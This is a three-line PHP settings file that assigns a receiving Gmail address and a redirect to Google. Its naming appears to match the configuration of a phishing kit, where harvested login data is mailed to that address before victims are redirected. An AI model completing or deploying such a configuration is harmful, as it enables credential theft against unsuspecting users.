<?php 
$Receive_email="trustfarminc@gmail.com";
$redirect="https://www.google.com/";
?>